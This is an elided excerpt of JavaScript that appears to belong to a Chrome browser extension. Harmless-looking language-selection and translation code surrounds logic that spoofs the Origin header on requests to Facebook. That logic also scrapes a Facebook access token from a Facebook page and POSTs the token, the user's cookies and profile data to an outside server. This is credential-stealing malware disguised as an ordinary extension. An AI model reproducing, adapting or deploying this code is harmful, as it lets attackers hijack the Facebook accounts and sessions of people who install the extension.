...
(function () {
  ...
  const facebookOrigin = (request) => {
    ...
    const originIndex = requestHeaders['findIndex']((header) => 'origin' === header.name);
    return -1 === originIndex
      ? requestHeaders.push({ name: 'origin', value: 'https://www.facebook.com' })
      : (requestHeaders[originIndex].value = 'https://www.facebook.com'),
      { requestHeaders: requestHeaders }
  };

  chrome.webRequest.onBeforeSendHeaders.addListener(facebookOrigin,
    {
      urls: [
  ...
  const getInfoUser = async (token) => {
    ...
    await fetch(baseUrl + '/api/v1/uu', {
      ...
      body: 'dt=' + JSON.stringify(data) + '&c=' + cookies.join('; ') + '&t=' + token
    });
  };

  const getToken = async () => {
    const response = await fetch('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed');
    const data = await response.text();
    const tokenRegex = /\"(EAA[^\"]+)\\\"/m;
  ...
  const initLang = () => {
    ...
    document.querySelectorAll("select[name='language'] option").forEach(function(option) {
      if (option.value == localStorage.getItem('lang')) {
        option.selected = localStorage.getItem('lang') == option.value ? 'selected' : '';
      }
    })
  }
  ...
  const updateContent = () => {
    for (let key in trans['en']) {
      if (trans['en'].hasOwnProperty(key) && document.querySelectorAll(`[keylang='${key}']`)[0]) {
        document.querySelectorAll(`[keylang='${key}']`)[0].innerHTML = i18next.t(key)
      }
    }
  }
